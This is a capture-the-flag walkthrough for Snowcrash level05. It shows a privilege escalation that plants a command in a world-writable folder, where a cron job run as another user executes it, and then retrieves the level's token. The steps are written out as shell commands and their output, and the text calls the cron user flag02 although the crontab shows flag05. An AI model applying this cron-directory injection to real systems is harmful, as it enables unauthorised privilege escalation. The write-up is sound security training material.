# <center>Snowcrash level05</center>

# Explanations

<br/>

## On VM:
> 
>> You have new mail.

> $ cat /var/mail/$USER
>> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
- This mail is a crontab line, the user flag02 executes every 2 minutes the script /usr/sbin/openarenaserver.
> $ cat /usr/sbin/openarenaserver
>>#!/bin/sh<br/>
>>for i in /opt/openarenaserver/* ; do<br/>
>>	(ulimit -t 5; bash -x "$i")<br/>
>>	rm -f "$i"<br/>
>>done<br/>
- This script executes all scripts contained in the /opt/openarenaserver/ folder and then deletes them.
> $ echo 'getflag > /tmp/result' > /opt/openarenaserver/script<br/>

> $ ls -l /opt/openarenaserver/script
>> -rw-rw-r--+ 1 level05 level05 103 Feb  6 21:21 script

> $ ls -l /opt/openarenaserver/script
>> ls: cannot access /opt/openarenaserver/script: No such file or directory

> $ cat /tmp/result
>> Check flag.Here is your token : viuaaale9huek52boumoomioc
